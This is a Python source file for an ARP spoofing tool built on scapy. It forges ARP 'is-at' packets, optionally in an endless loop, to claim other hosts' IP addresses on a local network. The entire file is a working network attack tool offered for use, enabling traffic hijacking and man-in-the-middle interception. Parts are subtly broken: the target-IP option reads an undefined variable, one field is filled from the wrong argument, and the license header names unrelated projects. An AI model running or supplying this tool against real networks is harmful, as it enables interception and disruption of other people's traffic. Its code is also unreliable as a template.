#!/usr/bin/env python
"""
    Simple tool that sends out arp at-is messages to hijack ip adresses
    Copyright (C) 2015  Bram Staps (Glasswall B.V.)

    This file is part of ArpSpoof.
    Dhcpgag is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
    ArpSpoof is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
    You should have received a copy of the GNU General Public License
    along with Foobar.  If not, see <http://www.gnu.org/licenses/>.
"""

import argparse
import os
import sys
from time import sleep

import logging

#silent scapy import
t = sys.stderr
with open("/dev/null", "a") as sys.stderr:
    from scapy.all import *
sys.stderr = t


parser = argparse.ArgumentParser()
parser.add_argument("interface", help="The sending interface", type=str)
parser.add_argument("--interval", help="interval between packets in seconds (default = 5.0)", type=float)
parser.add_argument("--count", help="How Manny packets to send in total (default = 1, 0 = infinite)")

parser.add_argument("--ethermac", help="which mac address to set as sender in the ethernet frame (default = {--mac})")

parser.add_argument("--ip", help="which ip to claim with your mac (default = own)")
parser.add_argument("--mac", help="which mac to claim (default = own)")

parser.add_argument("--targetmac", help="target Mac address in ethernet frame (default = FF:FF:FF:FF:FF:FF)")
parser.add_argument("--targetethermac", help="target Mac address in Arp frame (default = 00:00:00:00:00:00)")
parser.add_argument("--targetetherip", help="target Ip address in Arp frame (default = 0.0.0.0)")
args = parser.parse_args()


if os.geteuid():
    sys.stderr.write("You need to be root.")
    exit(1)



#default behaviour is "spoofing" your own ip with your own mac
sendString = Ether() / ARP(op="is-at")

interval = 5.0
if args.interval: interval = args.interval
    
count = 1
if args.count: count = int(args.count)

if args.ip:
    sendString.getlayer("ARP").setfieldval("psrc", args.ip)

if args.mac:
    sendString.getlayer("ARP").setfieldval("hwsrc", args.mac)

if args.ethermac:
    sendString.getlayer("Ethernet").setfieldval("src", args.ethermac)
else:
    sendString.getlayer("Ethernet").setfieldval( "src", sendString.getlayer("ARP").getfieldval("hwsrc") )

if args.targetmac:
    sendString.getlayer("Ethernet").setfieldval("dst", args.targetmac)
else:
    sendString.getlayer("Ethernet").setfieldval("dst", "FF:FF:FF:FF:FF:FF")

if args.targetethermac:
    sendString.getlayer("ARP").setfieldval("hwdst", args.targetmac)
    
if args.targetetherip:
    sendString.getlayer("ARP").setfieldval("pdst", args.targetip)
    

def loop():
    sendp( sendString, verbose=False, iface=args.interface )
    sleep(interval)
        

if count:
    for x in xrange(count):
        loop()
else:
    while True:
        loop()
